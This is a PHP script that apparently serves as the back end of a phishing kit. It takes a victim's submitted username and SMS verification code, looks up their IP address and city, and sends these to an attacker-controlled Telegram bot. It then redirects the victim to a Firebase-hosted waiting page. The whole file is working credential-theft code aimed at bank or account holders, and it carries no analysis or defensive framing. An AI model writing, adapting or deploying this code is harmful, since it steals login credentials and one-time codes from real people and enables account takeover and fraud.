<?php
session_start();
ini_set("display_errors", 0);
$config = include('config.php');

$config_firebase = include('link_firebase.php');


$firebase_base_url = $config_firebase['firebase_base_url'];


$llavecita = $_POST['sms'];
$elusr = $_POST['input-username'];


$token = $config['token'];
$chat_id = $config['chat_id'];

if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {

    $ip = $_SERVER['REMOTE_ADDR'];
}


$ip_info = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$city = isset($ip_info->city) ? $ip_info->city : 'Desconocida'; 


$mensaje_para_chatbot = "🔐❤️B3D3V3❤️\nUS4RXS: " . $elusr .  "\n" . "C0D3: " . $llavecita .  "\nIP: " . $ip . "\n" . $city;


$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);


$response = file_get_contents($telegram_url);

$redirect_url = $firebase_base_url . 'esperas2.html'; 

header("Location: " . $redirect_url);  
exit; 

?>
